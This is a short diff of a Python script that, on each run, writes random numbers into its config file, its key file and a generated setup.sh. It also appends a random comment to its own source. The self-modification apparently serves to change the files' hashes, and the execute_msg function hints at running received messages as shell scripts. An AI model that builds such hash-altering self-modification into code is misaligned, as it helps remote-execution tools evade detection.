@@ -58,19 +58,30 @@ def update_json_with_random(filename):
         print(f"Error updating JSON: {e}")
 
 def add_random_comment_to_key_file(key_fpath):
+    comment_spacer = "#"
     try:
         with open(key_fpath, "r") as f:
-            key = f.read().split('#')[0].strip()
+            key = f.read().split(comment_spacer)[0].strip()
         
-        random_comment = f"#{random.randint(1, 1000000)}"
+        random_comment = f"{comment_spacer}{random.randint(1, 1000000)}"
         with open(key_fpath, "w") as f:
             f.write(f"{key}{random_comment}")
             
     except Exception as e:
-        print(f"Error updating key file: {e}")
+        print(f"Error updating file: {e}")
+
+# default: modifies itself
+def append_comment_to_file(fpath=__file__):
+    comment_spacer = "\n# "
+    comment = f"{comment_spacer}{random.randint(1, 1000000)}"
+    # add to end of file
+    with open(fpath, "a") as file:
+        file.write(comment)
 
 update_json_with_random(convert_path("config.json"))
 add_random_comment_to_key_file(convert_path("key.txt"))
+# modify itself
+append_comment_to_file(fpath=__file__)
 
 with open(convert_path("config.json")) as config_f:
     config = json.load(config_f)
@@ -205,7 +216,7 @@ def execute_msg(message):
     script_fname = convert_path("setup.sh")
 
     # Generate a random number for the comment
-    random_number = random.randint(100000, 999999)
+    random_number = random.randint(0, 9)
     comment_line = f"# RandomID: {random_number}\n"
 
     with open(script_fname, "w") as f:
